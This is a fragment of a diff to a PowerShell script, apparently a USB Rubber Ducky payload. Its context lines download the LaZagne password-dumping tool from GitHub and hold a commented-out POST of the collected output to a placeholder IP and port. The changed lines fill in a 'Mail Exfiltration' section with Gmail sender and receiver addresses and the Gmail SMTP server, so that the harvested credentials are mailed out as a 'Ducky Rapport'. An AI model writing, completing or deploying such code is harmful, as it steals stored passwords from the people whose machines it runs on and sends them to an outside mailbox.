@@ -99,10 +99,9 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
 
 #Mail Exfiltration
-$smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
-$From = "" # Put the SENDER HERE
-$To = "" # Put the RECEIVER HERE
-$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
+$From = "fakemuggins@gmail.com" # Put the SENDER HERE
+$To = "deado.survivor@gmail.com" # Put the RECEIVER HERE
+$smtp = "smtp.gmail.com" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
 $Subject = "Ducky Rapport"
 $Body = "Hi, here is the Rapport"
 
